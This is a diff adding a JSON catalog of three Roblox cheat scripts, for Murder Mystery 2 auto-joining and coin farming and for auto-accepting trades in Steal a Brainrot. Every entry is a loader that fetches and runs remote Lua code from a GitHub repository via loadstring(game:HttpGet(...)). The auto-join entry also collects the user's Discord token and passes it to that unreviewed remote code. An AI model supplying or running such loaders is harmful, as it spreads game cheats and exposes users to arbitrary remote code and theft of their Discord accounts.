@@ -1,1 +1,14 @@
-
+[
+  {
+    "title": "MM2 Auto Join",
+    "script": "_G.DiscordToken = \"\"\n_G.ChannelID = \"\"\n_G.MinValueToJoin = 500\n_G.CheckInterval = 5\n\nloadstring(game:HttpGet(\"https://raw.githubusercontent.com/platinww/CrustyMain/refs/heads/main/MM2/AutoJoin.lua\"))()"
+  },
+  {
+    "title": "SAB Auto Accept",
+    "script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/platinww/CrustyMain/refs/heads/main/Steal-A-Brainrot/AutoAcceptTrade.lua\"))()"
+  },
+  {
+    "title": "MM2 Coin Farm",
+    "script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/platinww/CrustyMain/refs/heads/main/MM2/Farm.lua\"))()"
+  }
+]
